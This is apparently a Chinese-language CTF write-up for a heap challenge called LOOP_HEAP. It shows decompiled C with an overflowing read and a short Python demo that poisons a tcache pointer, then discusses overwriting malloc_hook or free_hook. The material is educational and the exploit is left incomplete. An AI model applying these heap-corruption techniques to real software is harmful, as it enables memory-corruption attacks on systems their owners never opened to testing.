# LOOP_HEAP

连续分配和释放chunk，可以写入超界数据，保护全开。

![KQxMxO](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/KQxMxO.png)

**审计**

第一次输入分配size大小的chunk，第二次输入写入数据的长度size（可以超过chunk大小），第三次输入数据data。程序会不停循环，libc版本是2.27，所以包含tcachebins。

漏洞是在写chunk的时候能够堆溢出，覆盖下一个chunk。

特殊的是，当输入的size值为1234时，使我们能够修改buf指针。(不确定)

```c
  size_4 = 1;
  v8 = 20;
  sub_A3A();
  while ( 1 )
  {
    v3 = v8--;
    if ( v3 <= 0 )
      break;
    printf("malloc size: ");
    size = sub_AC9();
    if ( size == 1234 && size_4 ) //是我们能够修改buf指针
    {
      size_4 = 0;
      read(0, &buf, 8uLL);
      *buf = 0LL;
      size = *buf;
    }
    if ( size > 0x80 )
      exit(1);
    buf = malloc(size);
    if ( !buf )
      exit(1);
    if ( ::buf )
      free(::buf);
    ::buf = buf;
    printf("read size: ");
    sizea = sub_AC9();
    if ( sizea > 0x80 )
      exit(1);
    printf("data: ");
    if ( read(0, ::buf, sizea) <= 0 )
      exit(1);
  }
  return 0LL;
}
```

Demo

验证代码能够修改tcachebins指向0x41414141

![78xN00](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/78xN00.png)

```python
mrd(0x10,0x10,"A"*0x10)#chunk_a
mrd(0x10,0x10,"B"*0x10)#chunk_b
mrd(0x10,0x30,"C"*0x18+p64(0x21)+p64(0x41414141))#chunk_c
```

这道题的malloc_hook和free_hook居然在bss段，第一次见到这样的题目。。。这样的话只要能泄露程序地址就能写malloc_hook了，但是这并没有用，one_gadget地址还是不确定，如果能覆盖free_hook为system那还有可能。

![4JxJag](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/4JxJag.png)

